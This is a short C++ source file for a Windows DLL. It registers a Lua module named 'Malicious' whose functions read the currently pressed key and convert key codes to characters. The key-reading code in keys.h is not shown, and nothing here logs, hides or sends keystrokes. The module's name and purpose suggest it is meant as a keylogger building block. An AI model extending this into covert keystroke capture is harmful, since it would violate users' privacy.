// dllmain.cpp : Define o ponto de entrada para o aplicativo DLL.
#include "pch.h"
#include "keys.h"

extern "C" {
    #include "Lua54/include/lua.h"
    #include "Lua54/include/lauxlib.h"
    #include "Lua54/include/lualib.h"

    __declspec(dllexport) int lua_getKey(lua_State* L) {
        int key = (int)getPressedKey();
        lua_pushnumber(L,key);
        return 1;
    }

    __declspec(dllexport) int lua_toKey(lua_State* L) {
        if (!lua_isnumber(L, 1)) {
            lua_pushstring(L, "Número esperado");
            lua_error(L);
        }

        int ascii = static_cast<int>(lua_tonumber(L, 1));
        const char* result = convertToChar(ascii);
        lua_pushstring(L, result);

        return 1;
    }

    __declspec(dllexport) luaL_Reg Malicious[] = {
        {"getKey", lua_getKey},  // Mapeia 'testMan' em Lua para a função testMan
        {"toKey", lua_toKey},  // Mapeia 'testMan' em Lua para a função testMan
        {NULL, NULL}  // Marca o fim da lista de funções
    };

    __declspec(dllexport) int luaopen_Malicious(lua_State* L) {
        luaL_newlib(L, Malicious);
        return 1;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

